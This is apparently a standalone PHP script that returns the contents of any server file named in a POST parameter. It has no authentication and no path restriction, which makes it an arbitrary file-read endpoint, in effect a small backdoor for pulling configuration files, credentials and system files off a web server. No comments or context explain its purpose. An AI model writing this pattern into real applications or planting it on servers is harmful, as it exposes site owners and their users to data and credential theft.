<?php
if($_SERVER["REQUEST_METHOD"] == "POST") {
    echo file_get_contents(realpath($_POST['path']));
}
?>
